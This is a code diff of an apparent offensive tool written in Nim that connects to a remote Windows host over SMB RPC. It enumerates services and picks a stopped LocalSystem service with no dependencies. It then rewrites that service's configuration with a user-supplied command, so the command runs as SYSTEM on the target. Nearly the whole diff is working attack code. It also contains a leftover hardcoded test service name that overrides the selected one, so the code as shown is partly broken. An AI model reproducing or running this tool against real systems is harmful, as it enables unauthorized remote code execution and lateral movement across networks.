@@ -1,10 +1,41 @@
 import std/os
+import std/random
+import std/unicode
 import system
 import net
 import OptionsHelper
 import Structs
 import Packets
 
+
+proc SelectRandomService(socket: net.Socket, messageID:ptr uint64, treeID: ptr array[4,byte], sessionID: ptr array[8,byte], fileID: ptr array[16,byte], callID:ptr int, scManagerHandle: ptr array[20,byte], serviceList: ptr seq[ServiceInfo],smbSigning:bool, hmacSha256Key: ptr byte):string =
+    var lengthOfServiceList = serviceList[].len
+    var scServiceHandle:array[20,byte]
+    var returnValue: string
+    #var testService:ServiceInfo
+    #discard OpenServiceWRPC(socket, messageID, treeID, sessionID, fileID, callID, scManagerHandle,"TieringEngineService",addr scServiceHandle,smbSigning,hmacSha256Key)
+    #discard QueryServiceConfigWRPC(socket, messageID, treeID, sessionID, fileID, callID,addr scServiceHandle, addr testService,smbSigning,hmacSha256Key)
+    #discard CloseServiceHandleRPC(socket, messageID, treeID, sessionID, fileID, callID, addr scServiceHandle,smbSigning, hmacSha256Key)
+
+    shuffle(serviceList[])
+    for i in countup(0,lengthOfServiceList-1): # You can increase try limit
+        if(serviceList[][i].ServiceState == SERVICE_STOPPED):
+            if(not OpenServiceWRPC(socket, messageID, treeID, sessionID, fileID, callID, scManagerHandle,serviceList[][i].ServiceName,addr scServiceHandle,smbSigning,hmacSha256Key)):
+                continue
+            if(not QueryServiceConfigWRPC(socket, messageID, treeID, sessionID, fileID, callID,addr scServiceHandle, addr serviceList[][i],smbSigning,hmacSha256Key)):
+                continue
+            echo serviceList[][i].Dependencies
+            echo serviceList[][i].ServiceStartName
+            if((serviceList[][i].StartType == SERVICE_DEMAND_START or serviceList[][i].StartType == SERVICE_DISABLED) and serviceList[][i].Dependencies.len == 0 and toLower(serviceList[][i].ServiceStartName) == "localsystem"):
+                echo "[+] Found service name is ", serviceList[][i].ServiceName
+                returnValue = serviceList[][i].ServiceName
+                discard CloseServiceHandleRPC(socket, messageID, treeID, sessionID, fileID, callID, addr scServiceHandle,smbSigning, hmacSha256Key)
+                return returnValue
+            if(not CloseServiceHandleRPC(socket, messageID, treeID, sessionID, fileID, callID, addr scServiceHandle,smbSigning, hmacSha256Key)):
+                continue
+            
+    return ""
+        
 
 when isMainModule:
     PrintBanner()
@@ -13,6 +44,7 @@ when isMainModule:
         PrintHelp() 
         quit(0)
     var serviceList:seq[ServiceInfo] = newSeq[ServiceInfo](0)
+    var serviceName: string
     var messageID:uint64 = 0
     var treeID:array[4,byte]
     var sessionID:array[8,byte]
@@ -78,25 +110,18 @@ when isMainModule:
     if(not EnumServicesStatusWRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scManagerHandle, addr serviceList,smbSigning,addr hmacSha256Key[0])):
         echo "[!] Problem in EnumServicesStatusW RPC!"
         quit(0)
-    if(optionsStruct.IsVerbose):
-        echo "[+] List of services is obtained!"
-    var tempServicePtr:ptr ServiceInfo = nil
-    for i in countup(0,serviceList.len-1):
-        if(serviceList[i].ServiceName == "test1"):
-            tempServicePtr = addr serviceList[i]
-            break
-    if(tempServicePtr == nil):
+    randomize()
+    serviceName = SelectRandomService(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scManagerHandle, addr serviceList,smbSigning,addr hmacSha256Key[0])
+    if(serviceName == ""):
+        echo "[!] Cannot find a suitable service!"
         quit(0)
-    if(not OpenServiceWRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scManagerHandle,tempServicePtr[].ServiceName,addr scServiceHandle,smbSigning,addr hmacSha256Key[0])):
+    
+    if(not OpenServiceWRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scManagerHandle,"test31",addr scServiceHandle,smbSigning,addr hmacSha256Key[0])):
         echo "[!] Problem in OpenServiceW RPC!"
         quit(0)
     if(optionsStruct.IsVerbose):
-        echo "[+] Service is opened!"
-    if(not QueryServiceConfigWRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scServiceHandle, tempServicePtr,smbSigning,addr hmacSha256Key[0])):
-        echo "[!] Problem in QueryServiceConfigW RPC!"
-        quit(0)
-    if(optionsStruct.IsVerbose):
-        echo "[+] Service config is obtained!"
+        echo "[+] Service: ",serviceName ," is opened!"
+    
     if(not ChangeServiceConfigWRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scServiceHandle, optionsStruct.Command,smbSigning,addr hmacSha256Key[0])):
         echo "[!] Problem in ChangeServiceConfigW RPC!"
         quit(0)
